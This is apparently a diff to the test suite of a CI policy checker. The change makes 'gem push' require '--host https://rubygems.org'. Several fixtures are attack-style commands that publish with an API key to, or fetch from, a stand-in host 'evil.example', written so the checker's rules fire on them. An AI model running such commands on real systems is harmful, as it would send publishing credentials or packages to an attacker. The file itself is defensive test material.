@@ -384,7 +384,7 @@ describe("each rule fires on a fixture that breaks only it", () => {
   ])("3 a publish job running %s", (cmd, why) => fires(run(swap(UPLOAD, cmd)), why));
   it.each([
     'dotnet nuget push "./release/${UNIT_COORDINATES}.${UNIT_VERSION}.nupkg" --source https://api.nuget.org/v3/index.json',
-    'gem push "./release/$ARTIFACT"',
+    'gem push "./release/$ARTIFACT" --host https://rubygems.org',
   ])("3 accepts the registry client upload %s", (cmd) =>
     expect(
       run(
@@ -814,7 +814,8 @@ const REASONS = {
     "git push: every refspec is <HEAD|refs/\u2026>:refs/heads|tags/\u2026, never forced",
   "dotnet --source elsewhere":
     "dotnet nuget push: --source must be exactly https://api.nuget.org/v3/index.json",
-  "gem push --host": "gem push: --host is not an option it may take",
+  "gem push --host": "gem push: --host must be exactly https://rubygems.org",
+  "gem push without a host": "gem push must run with --host",
   "curl -o": "curl: -o is not an option it may take",
   "curl -K": "curl: -K is not an option it may take",
   "curl to another host":
@@ -967,6 +968,7 @@ describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 r
       'dotnet nuget push "./x.nupkg" --api-key "$K" --source https://evil.example/v3/index.json',
     ],
     ["gem push --host", 'gem push --host https://evil.example "./x.gem"'],
+    ["gem push without a host", 'gem push "./release/$ARTIFACT"'],
     ["curl -o", "curl -fsS -o x https://proxy.golang.org/x"],
     ["curl -K", "curl -K cfg https://proxy.golang.org/x"],
     ["curl to another host", "curl -fsS https://evil.example/x"],
